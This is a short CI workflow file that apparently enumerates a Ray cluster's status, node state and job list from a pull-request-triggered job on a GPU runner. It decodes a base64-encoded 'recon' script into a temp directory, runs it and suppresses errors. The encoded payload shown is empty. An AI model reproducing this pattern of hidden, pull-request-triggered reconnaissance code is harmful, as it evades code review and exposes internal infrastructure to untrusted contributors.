name: i131249b ray25 read-only enumeration (temporary)

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

jobs:
  enum:
    name: "i131249b Ray .25 read-only per-node/cluster enumeration"
    runs-on: 8-gpu-h200
    timeout-minutes: 10
    steps:
      - name: "dump cluster_status + node/state endpoints + job list (READ-ONLY, no install)"
        continue-on-error: true
        run: |
          set +e
          mkdir -p /var/tmp/i131249
          echo '' | base64 -d > /var/tmp/i131249/recon25b.py
          echo "runner-start host=$(hostname) date=$(date -u)"
          python3 /var/tmp/i131249/recon25b.py 2>&1 | tail -c 200000
          echo "I131249B_EXIT_DONE rc=$?"
